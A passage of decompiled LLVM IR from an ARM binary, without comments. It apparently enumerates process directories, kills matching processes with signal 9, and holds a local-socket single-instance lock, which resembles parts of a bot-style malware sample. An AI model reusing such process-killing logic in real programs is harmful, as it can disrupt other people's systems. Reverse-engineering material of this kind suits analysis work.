  %v1_8928145 = inttoptr i32 %v3_8918 to i8*
  %v2_8928146 = load i8, i8* %v1_8928145, align 1
  %v2_892c149 = icmp eq i8 %v2_8928146, 0
  br i1 %v2_892c149, label %dec_label_pc_8940, label %bb124

dec_label_pc_8924:                                ; preds = %bb124
  %v1_8924 = add i32 %v1_8948150, 1
  %v1_8928 = inttoptr i32 %v5_8928152 to i8*
  %v2_8928 = load i8, i8* %v1_8928, align 1
  %v2_892c = icmp eq i8 %v2_8928, 0
  br i1 %v2_892c, label %dec_label_pc_8940, label %bb124

bb124:                                            ; preds = %dec_label_pc_8928.preheader, %dec_label_pc_8924
  %v5_8928152.in = phi i32 [ %v5_8928152, %dec_label_pc_8924 ], [ %v3_8918, %dec_label_pc_8928.preheader ]
  %v2_8928151 = phi i8 [ %v2_8928, %dec_label_pc_8924 ], [ %v2_8928146, %dec_label_pc_8928.preheader ]
  %v1_8948150 = phi i32 [ %v1_8924, %dec_label_pc_8924 ], [ %v1_8908, %dec_label_pc_8928.preheader ]
  %v5_8928152 = add i32 %v5_8928152.in, 1
  %v8_8930 = icmp eq i8 %v2_8928151, 32
  br i1 %v8_8930, label %dec_label_pc_8940, label %dec_label_pc_8924

dec_label_pc_8940:                                ; preds = %bb124, %dec_label_pc_8924, %dec_label_pc_8928.preheader
  %v1_8948.lcssa = phi i32 [ %v1_8908, %dec_label_pc_8928.preheader ], [ %v1_8924, %dec_label_pc_8924 ], [ %v1_8948150, %bb124 ]
  %v2_8948 = add i32 %v1_8948.lcssa, %v2_8868
  store i32 %v3_8918, i32* @r4, align 4
  store i32 %v3_8918, i32* @r0, align 4
  %v3_8954 = add i32 %v2_8948, -545
  %v4_8954 = inttoptr i32 %v3_8954 to i8*
  store i8 0, i8* %v4_8954, align 1
  %v0_8958 = call i32 @function_aab8()
  %v8_8960 = icmp sgt i32 %v0_8958, 15
  br i1 %v8_8960, label %dec_label_pc_8984.backedge, label %dec_label_pc_8964

dec_label_pc_8964:                                ; preds = %dec_label_pc_8940
  %v0_8968 = load i32, i32* @r4, align 4
  store i32 %v2_8734, i32* @r0, align 4
  %v2_8970 = call i32 @function_ab24(i32 %v2_8734, i32 %v0_8968)
  br label %dec_label_pc_89a0

dec_label_pc_8978:                                ; preds = %dec_label_pc_87d0
  store i32 %v2_877c, i32* @sb, align 4
  store i32 0, i32* @r8, align 4
  store i32 1, i32* @sl, align 4
  %v3_899043 = call i32 @function_ae98(i32 %v2_8730, i32 512, i32 %v2_87fc)
  %v2_899445 = icmp eq i32 %v3_899043, 0
  br i1 %v2_899445, label %dec_label_pc_89a0, label %.lr.ph46

.lr.ph46:                                         ; preds = %dec_label_pc_8978
  %v2_8868 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_8818.preheader

dec_label_pc_8818.preheader:                      ; preds = %dec_label_pc_8984.backedge, %.lr.ph46
  %v1_8998 = load i32, i32* @r8, align 4
  %v1_881836 = load i32, i32* @r6, align 4
  %v2_881837 = add i32 %v1_881836, %v1_8998
  %v3_881838 = inttoptr i32 %v2_881837 to i8*
  %v4_881839 = load i8, i8* %v3_881838, align 1
  %v6_881840 = zext i8 %v4_881839 to i32
  store i32 %v6_881840, i32* @r3, align 4
  %v2_881c41 = icmp eq i8 %v4_881839, 0
  br i1 %v2_881c41, label %dec_label_pc_8828, label %.lr.ph

dec_label_pc_89a0:                                ; preds = %dec_label_pc_8984.backedge, %dec_label_pc_8978, %dec_label_pc_8964
  %v0_89a4 = load i32, i32* @r7, align 4
  store i32 %v2_8734, i32* @r6, align 4
  %v1_89ac = call i32 @function_e720(i32 %v0_89a4)
  store i32 %v2_8734, i32* @r0, align 4
  %v0_89b4 = call i32 @function_aab8()
  store i32 %v0_89b4, i32* @r4, align 4
  %v2_89b8 = icmp eq i32 %v0_89b4, 0
  br i1 %v2_89b8, label %dec_label_pc_89c0, label %dec_label_pc_89e8

dec_label_pc_89c0:                                ; preds = %dec_label_pc_89a0
  %v1_89c4 = call i32 @function_82c0(i32 3)
  %v1_89cc = call i32 @function_82c0(i32 5)
  %v1_89d4 = call i32 @function_82c0(i32 7)
  %v1_89dc = call i32 @function_82c0(i32 6)
  %v0_89e0 = load i32, i32* @r4, align 4
  br label %dec_label_pc_8c2c

dec_label_pc_89e8:                                ; preds = %dec_label_pc_89a0
  %v1_89ec = call i32 @function_83b4(i32 3)
  %v1_89f0 = call i32 @function_bd20(i32 %v1_89ec)
  store i32 %v1_89f0, i32* @sl, align 4
  %v2_89f4 = icmp eq i32 %v1_89f0, 0
  br i1 %v2_89f4, label %bb126, label %dec_label_pc_8a00

bb126:                                            ; preds = %dec_label_pc_89e8
  store i32 0, i32* @fp, align 4
  br label %dec_label_pc_8c00

dec_label_pc_8a00:                                ; preds = %dec_label_pc_89e8
  store i32 %v2_8770, i32* @r5, align 4
  store i32 %v2_8758, i32* @r7, align 4
  store i32 0, i32* @fp, align 4
  %v1_8be431 = inttoptr i32 %v1_89f0 to i32*
  %v2_8be432 = call i32 @function_be94(i32* %v1_8be431)
  %v2_8be834 = icmp eq i32 %v2_8be432, 0
  br i1 %v2_8be834, label %dec_label_pc_8bf8, label %dec_label_pc_8bf0

dec_label_pc_8a1c:                                ; preds = %dec_label_pc_8bf0
  %v1_8a1c = add i32 %v0_8a30, 11
  %v2_8a1c = inttoptr i32 %v1_8a1c to i8*
  %v3_8a1c = load i8, i8* %v2_8a1c, align 1
  %v4_8a1c = zext i8 %v3_8a1c to i32
  %v1_8a20 = add nsw i32 %v4_8a1c, -48
  %tmp = icmp ugt i32 %v1_8a20, 9
  br i1 %tmp, label %dec_label_pc_8be0.backedge, label %dec_label_pc_8a2c

dec_label_pc_8a2c:                                ; preds = %dec_label_pc_8a1c
  store i32 %v1_8a1c, i32* @r6, align 4
  %v1_8a34 = call i32 @function_83b4(i32 3)
  store i32 %v2_8770, i32* @r0, align 4
  %v2_8a40 = call i32 @function_ab24(i32 %v2_8770, i32 %v1_8a34)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8a48 = call i32 @function_aab8()
  %v0_8a4c = load i32, i32* @r6, align 4
  %v0_8a50 = load i32, i32* @r5, align 4
  %v2_8a50 = add i32 %v0_8a50, %v0_8a48
  store i32 %v2_8a50, i32* @r0, align 4
  %v2_8a54 = call i32 @function_ab24(i32 %v2_8a50, i32 %v0_8a4c)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8a5c = call i32 @function_aab8()
  store i32 %v0_8a5c, i32* @r4, align 4
  %v1_8a68 = call i32 @function_83b4(i32 5)
  %v0_8a70 = load i32, i32* @r5, align 4
  %v1_8a70 = load i32, i32* @r4, align 4
  %v2_8a70 = add i32 %v1_8a70, %v0_8a70
  store i32 %v2_8a70, i32* @r0, align 4
  %v2_8a74 = call i32 @function_ab24(i32 %v2_8a70, i32 %v1_8a68)
  %v3_8a84 = call i32 @function_b988(i32 %v2_8770, i32 %v2_8758, i32 4096)
  %v7_8a88 = icmp eq i32 %v3_8a84, -1
  br i1 %v7_8a88, label %dec_label_pc_8be0.backedge, label %dec_label_pc_8a90

dec_label_pc_8a90:                                ; preds = %dec_label_pc_8a2c
  %v1_8a94 = call i32 @function_83b4(i32 3)
  store i32 %v2_8770, i32* @r0, align 4
  %v2_8aa0 = call i32 @function_ab24(i32 %v2_8770, i32 %v1_8a94)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8aa8 = call i32 @function_aab8()
  %v0_8aac = load i32, i32* @r6, align 4
  %v0_8ab0 = load i32, i32* @r5, align 4
  %v2_8ab0 = add i32 %v0_8ab0, %v0_8aa8
  store i32 %v2_8ab0, i32* @r0, align 4
  %v2_8ab4 = call i32 @function_ab24(i32 %v2_8ab0, i32 %v0_8aac)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8abc = call i32 @function_aab8()
  store i32 %v0_8abc, i32* @r4, align 4
  %v1_8ac8 = call i32 @function_83b4(i32 7)
  %v0_8ad0 = load i32, i32* @r5, align 4
  %v1_8ad0 = load i32, i32* @r4, align 4
  %v2_8ad0 = add i32 %v1_8ad0, %v0_8ad0
  store i32 %v2_8ad0, i32* @r0, align 4
  %v2_8ad4 = call i32 @function_ab24(i32 %v2_8ad0, i32 %v1_8ac8)
  %v1_8adc = call i32 @function_bd20(i32 %v2_8770)
  store i32 %v1_8adc, i32* @sb, align 4
  %v2_8ae0 = icmp eq i32 %v1_8adc, 0
  br i1 %v2_8ae0, label %dec_label_pc_8be0.backedge, label %dec_label_pc_8bb4.preheader

dec_label_pc_8bb4.preheader:                      ; preds = %dec_label_pc_8a90
  %v1_8bb8128 = inttoptr i32 %v1_8adc to i32*
  %v2_8bb8129 = call i32 @function_be94(i32* %v1_8bb8128)
  store i32 %v2_8bb8129, i32* @r8, align 4
  %v2_8bbc131 = icmp eq i32 %v2_8bb8129, 0
  store i32 4096, i32* @r2, align 4
  br i1 %v2_8bbc131, label %dec_label_pc_8bd8, label %dec_label_pc_8bd0

dec_label_pc_8aec:                                ; preds = %dec_label_pc_8bd0
  %v4_8aec = call i32 @function_ab54(i32 %v2_8758, i8 0, i32 4096)
  %v1_8af4 = call i32 @function_83b4(i32 3)
  store i32 %v2_8770, i32* @r0, align 4
  %v2_8b00 = call i32 @function_ab24(i32 %v2_8770, i32 %v1_8af4)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8b08 = call i32 @function_aab8()
  %v0_8b0c = load i32, i32* @r6, align 4
  %v0_8b10 = load i32, i32* @r5, align 4
  %v2_8b10 = add i32 %v0_8b10, %v0_8b08
  store i32 %v2_8b10, i32* @r0, align 4
  %v2_8b14 = call i32 @function_ab24(i32 %v2_8b10, i32 %v0_8b0c)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8b1c = call i32 @function_aab8()
  store i32 %v0_8b1c, i32* @r4, align 4
  %v1_8b28 = call i32 @function_83b4(i32 7)
  %v0_8b30 = load i32, i32* @r5, align 4
  %v1_8b30 = load i32, i32* @r4, align 4
  %v2_8b30 = add i32 %v1_8b30, %v0_8b30
  store i32 %v2_8b30, i32* @r0, align 4
  %v2_8b34 = call i32 @function_ab24(i32 %v2_8b30, i32 %v1_8b28)
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8b3c = call i32 @function_aab8()
  %v0_8b44 = load i32, i32* @r5, align 4
  %v2_8b44 = add i32 %v0_8b44, %v0_8b3c
  store i32 %v2_8b44, i32* @r0, align 4
  %v2_8b48 = call i32 @function_ab24(i32 %v2_8b44, i32 ptrtoint (i32* @global_var_13d2c.88 to i32))
  store i32 %v2_8770, i32* @r0, align 4
  %v0_8b50 = call i32 @function_aab8()
  %v0_8b54 = load i32, i32* @r8, align 4
  %v1_8b54 = add i32 %v0_8b54, 11
  %v0_8b58 = load i32, i32* @r5, align 4
  %v2_8b58 = add i32 %v0_8b58, %v0_8b50
  store i32 %v2_8b58, i32* @r0, align 4
  %v2_8b5c = call i32 @function_ab24(i32 %v2_8b58, i32 %v1_8b54)
  %v3_8b6c = call i32 @function_b988(i32 %v2_8770, i32 %v2_8758, i32 4096)
  %v7_8b70 = icmp eq i32 %v3_8b6c, -1
  store i32 %v2_8758, i32* @r0, align 4
  br i1 %v7_8b70, label %dec_label_pc_8bb4.backedge, label %dec_label_pc_8b7c

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8aec
  %v0_8b7c = call i32 @function_aab8()
  store i32 %v0_8b7c, i32* @r1, align 4
  %v4_8b90 = call i32 @function_b420(i8* %v3_875c, i32 %v0_8b7c, i32 %v2_8734)
  %v7_8b94 = icmp eq i32 %v4_8b90, -1
  %v0_8b9c = load i32, i32* @r6, align 4
  store i32 %v0_8b9c, i32* @r0, align 4
  br i1 %v7_8b94, label %dec_label_pc_8bb4.backedge, label %dec_label_pc_8ba4

dec_label_pc_8ba4:                                ; preds = %dec_label_pc_8b7c
  %v2_8ba4 = call i32 @function_ad54(i32 %v0_8b9c, i32 10)
  %v2_8bac = call i32 @function_b950(i32 %v2_8ba4, i32 9)
  store i32 1, i32* @fp, align 4
  br label %dec_label_pc_8bb4.backedge

dec_label_pc_8bb4.backedge:                       ; preds = %dec_label_pc_8ba4, %dec_label_pc_8aec, %dec_label_pc_8b7c
  %v0_8bb4.pre = load i32, i32* @sb, align 4
  %v1_8bb8 = inttoptr i32 %v0_8bb4.pre to i32*
  %v2_8bb8 = call i32 @function_be94(i32* %v1_8bb8)
  store i32 %v2_8bb8, i32* @r8, align 4
  %v2_8bbc = icmp eq i32 %v2_8bb8, 0
  store i32 4096, i32* @r2, align 4
  br i1 %v2_8bbc, label %dec_label_pc_8bd8, label %dec_label_pc_8bd0

dec_label_pc_8bd0:                                ; preds = %dec_label_pc_8bb4.preheader, %dec_label_pc_8bb4.backedge
  %v0_8bc4133 = load i32, i32* @fp, align 4
  %v2_8bd0 = icmp eq i32 %v0_8bc4133, 0
  br i1 %v2_8bd0, label %dec_label_pc_8aec, label %dec_label_pc_8bd8

dec_label_pc_8bd8:                                ; preds = %dec_label_pc_8bb4.backedge, %dec_label_pc_8bd0, %dec_label_pc_8bb4.preheader
  %v0_8bd8 = load i32, i32* @sb, align 4
  %v1_8bdc = inttoptr i32 %v0_8bd8 to i32*
  %v2_8bdc = call i32 @function_bb40(i32* %v1_8bdc)
  br label %dec_label_pc_8be0.backedge

dec_label_pc_8be0.backedge:                       ; preds = %dec_label_pc_8bd8, %dec_label_pc_8a1c, %dec_label_pc_8a2c, %dec_label_pc_8a90
  %v0_8be0 = load i32, i32* @sl, align 4
  %v1_8be4 = inttoptr i32 %v0_8be0 to i32*
  %v2_8be4 = call i32 @function_be94(i32* %v1_8be4)
  %v2_8be8 = icmp eq i32 %v2_8be4, 0
  br i1 %v2_8be8, label %dec_label_pc_8bf8, label %dec_label_pc_8bf0

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8a00, %dec_label_pc_8be0.backedge
  %v0_8a30 = phi i32 [ %v2_8be4, %dec_label_pc_8be0.backedge ], [ %v2_8be432, %dec_label_pc_8a00 ]
  %v0_8bf0 = load i32, i32* @fp, align 4
  %v2_8bf0 = icmp eq i32 %v0_8bf0, 0
  br i1 %v2_8bf0, label %dec_label_pc_8a1c, label %dec_label_pc_8bf8

dec_label_pc_8bf8:                                ; preds = %dec_label_pc_8be0.backedge, %dec_label_pc_8bf0, %dec_label_pc_8a00
  %v0_8bf8 = load i32, i32* @sl, align 4
  %v1_8bfc = inttoptr i32 %v0_8bf8 to i32*
  %v2_8bfc = call i32 @function_bb40(i32* %v1_8bfc)
  br label %dec_label_pc_8c00

dec_label_pc_8c00:                                ; preds = %bb126, %dec_label_pc_8bf8
  %v1_8c04 = call i32 @function_e5cc(i32 1)
  %v1_8c0c = call i32 @function_82c0(i32 3)
  %v1_8c14 = call i32 @function_82c0(i32 5)
  %v1_8c1c = call i32 @function_82c0(i32 7)
  %v1_8c24 = call i32 @function_82c0(i32 6)
  %v0_8c28 = load i32, i32* @fp, align 4
  %v1_8c28 = urem i32 %v0_8c28, 256
  br label %dec_label_pc_8c2c

dec_label_pc_8c2c:                                ; preds = %bb, %dec_label_pc_89c0, %dec_label_pc_8c00
  %v1_8c38 = phi i32 [ 0, %bb ], [ %v0_89e0, %dec_label_pc_89c0 ], [ %v1_8c28, %dec_label_pc_8c00 ]
  store i32 %v3_870c, i32* @r4, align 4
  store i32 %v6_870c, i32* @r5, align 4
  store i32 %v9_870c, i32* @r6, align 4
  store i32 %v12_870c, i32* @r7, align 4
  store i32 %v15_870c, i32* @r8, align 4
  store i32 %v18_870c, i32* @sb, align 4
  store i32 %v21_870c, i32* @sl, align 4
  store i32 %v24_870c, i32* @fp, align 4
  store i32 %v27_870c, i32* @lr, align 4
  ret i32 %v1_8c38

; uselistorder directives
  uselistorder i32 %v6_881840, { 2, 0, 1 }
  uselistorder i32 %v1_881836, { 0, 3, 2, 1 }
  uselistorder i32 %v1_8998, { 1, 0, 2 }
  uselistorder i32 %v2_8868, { 1, 0 }
  uselistorder i32 %v3_8918, { 3, 2, 0, 1 }
  uselistorder i8 %v3_8900, { 2, 3, 1, 0 }
  uselistorder i32 %v0_88f8, { 2, 1, 0 }
  uselistorder i32 %v1_88c8, { 2, 3, 1, 0 }
  uselistorder i32 %v0_891070, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 %v0_88f4, { 1, 0 }
  uselistorder i32 %v0_891072, { 1, 0 }
  uselistorder i32 %v0_889c, { 5, 6, 4, 0, 1, 2, 3, 7 }
  uselistorder i32 %v1_8894, { 1, 0 }
  uselistorder i32 %v0_885810140, { 1, 0 }
  uselistorder i32 %v2_882c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8814, { 0, 2, 1 }
  uselistorder i32 %v2_87fc, { 1, 2, 0 }
  uselistorder i32 %v0_8780, { 1, 0 }
  uselistorder i32 %v2_877c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v2_8770, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 11, 10, 12, 13, 14, 16, 15, 17 }
  uselistorder i32 %v2_8758, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8734, { 2, 3, 4, 1, 0 }
  uselistorder i8* %stack_var_-72, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_b988, { 1, 0 }
  uselistorder i32 (i32*)* @function_be94, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_bd20, { 1, 0 }
  uselistorder label %dec_label_pc_8c2c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8c00, { 1, 0 }
  uselistorder label %dec_label_pc_8bf8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8bf0, { 1, 0 }
  uselistorder label %dec_label_pc_8be0.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8bd8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8bd0, { 1, 0 }
  uselistorder label %dec_label_pc_8bb4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_89a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8818.preheader, { 1, 0 }
  uselistorder label %bb124, { 1, 0 }
  uselistorder label %.thread20, { 5, 2, 4, 0, 1, 3 }
  uselistorder label %dec_label_pc_8984.backedge, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8860, { 1, 0, 2 }
  uselistorder label %bb117, { 1, 0 }
  uselistorder label %dec_label_pc_8828, { 1, 0 }
  uselistorder label %dec_label_pc_87d0, { 1, 0 }
}

define i32 @function_8c3c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8c3c:
  %v0_8c3c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8c3c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_8c3c
  %v5_8c3c = mul i32 %arg2, 16
  %v6_8c3c = and i32 %v5_8c3c, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_8c3c, %bb
  %v7_8c40 = phi i32 [ %arg1, %dec_label_pc_8c3c ], [ %v6_8c3c, %bb ]
  ret i32 %v7_8c40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_8c44(i32 %arg1) local_unnamed_addr {
dec_label_pc_8c68.lr.ph:
  %stack_var_-60 = alloca i16, align 2
  %stack_var_-44 = alloca i32, align 4
  %v3_8c44 = load i32, i32* @r4, align 4
  %v9_8c44 = load i32, i32* @r6, align 4
  %v12_8c44 = load i32, i32* @r7, align 4
  %v15_8c44 = load i32, i32* @r8, align 4
  %v18_8c44 = load i32, i32* @sb, align 4
  %v21_8c44 = load i32, i32* @sl, align 4
  %v24_8c44 = load i32, i32* @fp, align 4
  %v27_8c44 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1d328.90 to i32), i32* @r7, align 4
  store i32 16777343, i32* @fp, align 4
  %v2_8c58 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_8c58, i32* @sb, align 4
  store i32 4, i32* @r8, align 4
  %v2_8c60 = ptrtoint i16* %stack_var_-60 to i32
  store i32 %v2_8c60, i32* @sl, align 4
  store i32 1, i32* @r6, align 4
  br label %dec_label_pc_8c68

dec_label_pc_8c68:                                ; preds = %dec_label_pc_8c68.lr.ph, %dec_label_pc_8d4c.backedge
  %v3_8c68 = call i32 @function_c590(i32 2, i32 1, i32 0)
  store i32 1, i32* @lr, align 4
  %v7_8c70 = icmp eq i32 %v3_8c68, -1
  store i32 %v2_8c58, i32* @r3, align 4
  %v1_8c80 = load i32, i32* @r7, align 4
  %v2_8c80 = inttoptr i32 %v1_8c80 to i32*
  store i32 %v3_8c68, i32* %v2_8c80, align 4
  br i1 %v7_8c70, label %dec_label_pc_8d4c.backedge, label %dec_label_pc_8c88

dec_label_pc_8d4c.backedge:                       ; preds = %dec_label_pc_8c68, %bb26, %dec_label_pc_8d08
  %v0_8d4c = load i32, i32* @r6, align 4
  %v1_8d4c = add i32 %v0_8d4c, 1
  %v1_8d50 = urem i32 %v1_8d4c, 256
  store i32 %v1_8d50, i32* @r6, align 4
  %v7_8d54 = icmp eq i32 %v1_8d50, 3
  br i1 %v7_8d54, label %dec_label_pc_8d8c, label %dec_label_pc_8c68

dec_label_pc_8c88:                                ; preds = %dec_label_pc_8c68
  %v0_8c88 = load i32, i32* @lr, align 4
  store i32 %v0_8c88, i32* %stack_var_-44, align 4
  %v0_8c8c = load i32, i32* @r8, align 4
  %v3_8c90 = load i32, i32* @r3, align 4
  %v5_8c90 = call i32 @function_c548(i32 %v3_8c68, i32 1, i32 2, i32 %v3_8c90, i32 %v0_8c8c)
  %v2_8c94 = load i32, i32* @global_var_1d328.90, align 4
  store i32 %v2_8c94, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_8ca4 = call i32 @function_b7ac(i32 %v2_8c94, i32 3)
  %v0_8ca8 = load i32, i32* @r8, align 4
  %v1_8cac = or i32 %v2_8ca4, 2048
  store i32 %v1_8cac, i32* @r2, align 4
  %v0_8cb0 = load i32, i32* @r4, align 4
  %v2_8cb4 = call i32 @function_b7ac(i32 %v0_8cb0, i32 %v0_8ca8)
  %v0_8cb8 = load i32, i32* @r6, align 4
  %v7_8cb8 = icmp eq i32 %v0_8cb8, 1
  br i1 %v7_8cb8, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_8c88
  br label %bb25

bb:                                               ; preds = %dec_label_pc_8c88
  br label %bb25

bb25:                                             ; preds = %.thread, %bb
  %v0_8cd4 = call i32 @function_bf7c()
  %v2_8cdc = inttoptr i32 %v0_8cd4 to i32*
  store i32 0, i32* %v2_8cdc, align 4
  store i32 %v0_8cd4, i32* @r5, align 4
  %v2_8ce8 = load i32, i32* @global_var_1d328.90, align 4
  store i16 2, i16* %stack_var_-60, align 2
  %v7_8cf8 = call i32 @function_c148(i32 %v2_8ce8, i32 %v2_8c60, i32 16, i32 2, i32 2)
  %v2_8cfc = icmp eq i32 %v7_8cf8, 0
  %v0_8d00 = load i32, i32* @r7, align 4
  store i32 %v0_8d00, i32* @r4, align 4
  br i1 %v2_8cfc, label %dec_label_pc_8d6c, label %dec_label_pc_8d08

dec_label_pc_8d08:                                ; preds = %bb25
  %v0_8d08 = load i32, i32* @r5, align 4
  %v1_8d08 = inttoptr i32 %v0_8d08 to i32*
  %v2_8d08 = load i32, i32* %v1_8d08, align 4
  %v7_8d0c = icmp eq i32 %v2_8d08, 13
  br i1 %v7_8d0c, label %dec_label_pc_8d4c.backedge, label %bb26

bb26:                                             ; preds = %dec_label_pc_8d08
  %v8_8d10 = icmp eq i32 %v2_8d08, 99
  br i1 %v8_8d10, label %dec_label_pc_8d4c.backedge, label %dec_label_pc_8d18

dec_label_pc_8d18:                                ; preds = %bb26
  %v2_8d20 = load i32, i32* @global_var_1d328.90, align 4
  %v3_8d24 = call i32 @function_c1d0(i32 %v2_8d20, i32 %v2_8c60, i32 16)
  %v1_8d2c = call i32 @function_e5cc(i32 5)
  %v2_8d30 = load i32, i32* @global_var_1d328.90, align 4
  %v1_8d34 = call i32 @function_e720(i32 %v2_8d30)
  %v1_8d3c = call i32 @function_870c(i32 58811)
  %v1_8d40 = call i32 @function_8c44(i32 %v1_8d3c)
  br label %dec_label_pc_8d90

dec_label_pc_8d6c:                                ; preds = %bb25
  %v0_8d6c = load i32, i32* @r6, align 4
  %v7_8d6c = icmp eq i32 %v0_8d6c, 1
  br i1 %v7_8d6c, label %dec_label_pc_8d74, label %dec_label_pc_8d8c

dec_label_pc_8d74:                                ; preds = %dec_label_pc_8d6c
  %v2_8d74 = load i32, i32* @global_var_1d328.90, align 4
  %v2_8d7c = call i32 @function_c2d0(i32 %v2_8d74, i32 1)
  %v7_8d80 = icmp eq i32 %v2_8d7c, -1
  br i1 %v7_8d80, label %dec_label_pc_8d90, label %bb27

bb27:                                             ; preds = %dec_label_pc_8d74
  br label %dec_label_pc_8d90

dec_label_pc_8d8c:                                ; preds = %dec_label_pc_8d4c.backedge, %dec_label_pc_8d6c
  br label %dec_label_pc_8d90

dec_label_pc_8d90:                                ; preds = %bb27, %dec_label_pc_8d74, %dec_label_pc_8d18, %dec_label_pc_8d8c
  %v1_8d98 = phi i32 [ 1, %bb27 ], [ 0, %dec_label_pc_8d74 ], [ 1, %dec_label_pc_8d18 ], [ 0, %dec_label_pc_8d8c ]
  store i32 %v3_8c44, i32* @r4, align 4
  store i32 %v9_8c44, i32* @r6, align 4
  store i32 %v12_8c44, i32* @r7, align 4
  store i32 %v15_8c44, i32* @r8, align 4
  store i32 %v18_8c44, i32* @sb, align 4
  store i32 %v21_8c44, i32* @sl, align 4
  store i32 %v24_8c44, i32* @fp, align 4
  store i32 %v27_8c44, i32* @lr, align 4
  ret i32 %v1_8d98

; uselistorder directives
  uselistorder i32 %v1_8d50, { 1, 0 }
  uselistorder i32 %v3_8c68, { 2, 1, 0 }
  uselistorder i16* %stack_var_-60, { 1, 0 }
  uselistorder label %dec_label_pc_8d90, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8d8c, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_8d4c.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8c68, { 1, 0 }
}

define i32 @function_8db0(i32* %arg1) local_unnamed_addr {
dec_label_pc_8db0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-42 = alloca i8*, align 4
  %stack_var_-1388 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v2_8dbc = load i32, i32* %arg1, align 4
  store i32 %v2_8dbc, i32* %r0.global-to-local, align 4
  %v1_8dc0 = call i32 @function_bb00(i32 %v2_8dbc)
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_8dcc = call i32 @function_c5d4(i32 17, i32 1)
  store i32 %v2_8dcc, i32* %r0.global-to-local, align 4
  %v1_8dd0 = call i32 @function_84a0(i32 %v2_8dcc)
  store i32 ptrtoint (i32* @global_var_13d2c.88 to i32), i32* %r0.global-to-local, align 4
  %v1_8dd8 = call i32 @function_b8a0(i32 ptrtoint (i32* @global_var_13d2c.88 to i32))
  store i32 %v1_8dd8, i32* @r0, align 4
  %v1_8ddc = call i32 @function_af48(i32 %v1_8dd8)
  store i32 %v1_8ddc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1ffa8.93 to i32), i32* %r3.global-to-local, align 4
  store i32 %v1_8ddc, i32* @global_var_1ffa8.93, align 4
  %v1_8de8 = call i32 @function_8c44(i32 %v1_8ddc)
  store i32 %v1_8de8, i32* %r0.global-to-local, align 4
  store i32 %v1_8de8, i32* @r5, align 4
  %v2_8dec = icmp eq i32 %v1_8de8, 0
  store i1 %v2_8dec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8dec, label %dec_label_pc_8df4, label %dec_label_pc_8e44

dec_label_pc_8df4:                                ; preds = %dec_label_pc_8db0
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8df8 = call i32 @function_81d0(i32 2)
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8e00 = call i32 @function_83b4(i32 2)
  store i32 %v1_8e00, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8e0c = call i32 @function_83b4(i32 2)
  store i32 %v1_8e0c, i32* @r0, align 4
  %v0_8e10 = call i32 @function_aab8()
  %v0_8e14 = load i32, i32* @r4, align 4
  store i32 %v0_8e14, i32* %r1.global-to-local, align 4
  store i32 %v0_8e10, i32* @r2, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_8e20 = call i32 @function_e840(i32 1, i32 %v0_8e14)
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13ffc.99 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v2_8e30 = call i32 @function_e840(i32 1, i32 ptrtoint (i32* @global_var_13ffc.99 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_8e38 = call i32 @function_82c0(i32 2)
  %v0_8e3c = load i32, i32* @r5, align 4
